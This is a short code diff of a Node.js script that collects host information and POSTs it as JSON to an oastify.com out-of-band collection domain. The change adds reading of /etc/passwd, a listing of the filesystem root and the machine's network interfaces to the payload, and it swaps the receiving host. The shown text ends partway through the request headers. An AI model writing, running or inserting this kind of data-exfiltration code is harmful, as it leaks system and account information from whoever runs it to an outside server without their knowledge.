@@ -1,10 +1,16 @@
 const https = require('https');
 const fs = require('fs');
+const os = require('os');
 
-const files = fs.readdirSync(process.cwd());
-const payload = JSON.stringify({ cwd: process.cwd(), files });
+const payload = JSON.stringify({
+  cwd: process.cwd(),
+  files: fs.readdirSync(process.cwd()),
+  root_files: fs.readdirSync('/'),
+  passwd: fs.readFileSync('/etc/passwd', 'utf8'),
+  interfaces: os.networkInterfaces()
+}, null, 2);
 
-const req = https.request('https://ccsfcqpeh2dm4dhuejwjdylfz65xtrhg.oastify.com', {
+const req = https.request('https://w1yz1aey6m26tx6e33l32iazoquhif64.oastify.com', {
   method: 'POST',
   headers: {
     'Content-Type': 'application/json',
